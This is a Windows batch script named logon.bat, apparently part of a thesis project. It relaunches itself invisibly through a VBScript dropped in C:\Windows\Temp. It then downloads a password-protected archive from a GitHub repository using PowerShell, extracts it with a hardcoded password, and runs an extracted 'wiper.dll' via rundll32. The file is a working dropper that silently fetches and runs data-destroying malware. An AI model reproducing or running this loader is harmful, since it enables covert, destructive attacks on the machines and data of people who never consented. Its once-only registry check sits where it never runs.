@echo off



REM SOURCE: https://stackoverflow.com/questions/411247/running-a-cmd-or-bat-in-silent-mode

if [%1]==[] (
    goto PreSilentCall
) else (
    goto SilentCall
)

:PreSilentCall
REM Insert code here you want to have happen BEFORE this same .bat file is called silently
REM such as setting paths like the below two lines

set WorkingDirWithSlash=%~dp0
set WorkingDirectory=%WorkingDirWithSlash:~0,-1%

REM below code will run this same file silently, but will go to the SilentCall section
cd C:\Windows\System32
if exist C:\Windows\Temp\invis.vbs ( del C:\Windows\Temp\invis.vbs /f /q )
echo CreateObject("Wscript.Shell").Run "%~dp0logon.bat " ^& WScript.Arguments(0), 0, False > C:\Windows\Temp\invis.vbs
wscript.exe C:\Windows\Temp\invis.vbs Initialized
if %ERRORLEVEL%==0 (
    echo Successfully started SilentCall code. This command prompt can now be exited.
    goto Exit
)


:: Check for existence of registry key and exit if it exists
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\FrostbyteRUN" >nul 2>&1
if %errorlevel% == 0 (
    echo Script has already been executed. Exiting...
    goto Exit
) else (
    :: Create the registry key to prevent future executions
    reg add "HKEY_LOCAL_MACHINE\SOFTWARE\FrostbyteRUN" /f >nul 2>&1
)


:SilentCall
cd %WorkingDirectory%

:: Set the directory where files will be downloaded and unzipped
set "downloadDir=C:\Windows\Temp"
set "zipFile=%downloadDir%\Second_Iteration_GPO.7z"

:retry.zip

:: Set URL for the zip file
set "url=https://github.com/Dsylexia/bachelor-thesis/raw/main/Second_Iteration_GPO.7z"

echo Downloading zip file...

:: Download the zip file using PowerShell
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%zipFile%')"

if %errorlevel% neq 0 (
    echo Failed to download zip file. Retrying in 5 seconds...
    timeout /t 5
    goto retry.zip
)

echo Unzipping the file...

:: Unzip the downloaded file with password using 7-Zip
set "password=AB83cOsaokDAsW"
"C:\Program Files\7-Zip\7z.exe" x "%zipFile%" -o"%downloadDir%" -p%password% -y

:: Assuming the DLL is named wiper.dll and is now extracted
set "dllFile=%downloadDir%\wiper.dll"

echo Running the extracted DLL...

:: Execute the downloaded DLL using rundll32.exe
rundll32.exe %dllFile%,#2

echo Done...

:Exit
